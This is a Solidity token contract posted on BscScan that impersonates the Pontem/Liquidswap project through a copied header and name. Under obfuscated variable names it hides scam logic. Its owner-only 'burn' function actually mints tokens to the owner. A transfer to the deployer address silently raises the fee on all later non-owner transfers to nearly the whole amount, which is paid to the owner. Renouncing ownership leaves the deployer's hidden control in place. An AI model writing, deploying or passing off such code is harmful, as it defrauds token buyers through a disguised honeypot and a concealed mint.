/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

////////////////////////////////////////////////////////////////////////
//Pontem
//Building https://liquidswap.com & Pontem Wallet on 
//Opinions are not our own... 🛸 https://discord.gg/44QgPFHYqs
//Calling all bounty hunters! 📣
//We’re launching a bug bounty for Liquidswap, our Aptos DEX!
////////////////////////////////////////////////////////////////////////

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;
contract Pontem {
uint256 private  CVPWFC = 100000000;
uint256 private  DDBFWQ = 1000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  COVNRN = 10000000000000;
address private  LEKKKD = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  KRHNDM = 1000000000000000000;
uint8 public constant decimals = 18;
uint256 private  FZYRRB = 1000000000000000;
uint256 public constant QXFUPA = 99999;
address private  UZSMDK = address(0);
string public  name = "Pontem";
address private  JKLWMW = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  LOBEXP = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
mapping (address => uint256) public balanceOf;
uint256 private  KGSERV = 1000000000000000000;
uint256 private  SUEOXT = 10000000000;
address private  DHXAXE = address(0);
string public  symbol = "Pontem";
function _getJKLWMW() private returns (address) {
return JKLWMW;
}

function _getUZSMDK() private returns (address) {
return UZSMDK;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () {
DHXAXE = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getFZYRRB() private returns (uint256) {
return FZYRRB;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getCOVNRN() private returns (uint256) {
return COVNRN;
}

function _getDDBFWQ() private returns (uint256) {
return DDBFWQ;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getLOBEXP() private returns (address) {
return LOBEXP;
}

function _getKRHNDM() private returns (uint256) {
return KRHNDM;
}

function _getLEKKKD() private returns (address) {
return LEKKKD;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "HXWYZE");
require(to != address(0), "HXWYZE");
require(amount <= balanceOf[from], "HXWYZE");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* QXFUPA/KGSERV ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==DHXAXE){
KGSERV = QXFUPA+2;
}
emit Transfer(from, to, transferAmount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getSUEOXT() private returns (uint256) {
return SUEOXT;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tHXWYZE 0");
require(spender != address(0), "fHXWYZE 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getCVPWFC() private returns (uint256) {
return CVPWFC;
}


}